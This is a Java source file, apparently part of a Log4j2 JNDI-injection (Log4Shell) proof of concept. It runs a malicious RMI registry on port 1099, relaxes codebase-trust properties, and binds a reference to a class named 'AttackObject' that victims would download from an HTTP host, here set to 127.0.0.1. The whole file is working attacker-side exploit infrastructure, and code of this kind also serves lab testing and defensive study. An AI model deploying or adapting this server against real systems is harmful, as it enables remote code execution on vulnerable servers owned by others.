package com.github.bluegitter.log4j2;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * JNDI服务
 **/
public class RegistryServer {

    public static void main(String[] args)
            throws RemoteException, NamingException, AlreadyBoundException {
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        Registry registry = LocateRegistry.createRegistry(1099);
        Reference ref = new Reference("AttackObject",
                "AttackObject",
                "http://127.0.0.1:80");
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("obj", wrapper);

        System.out.println("RegistryServer is running...");

    }
}
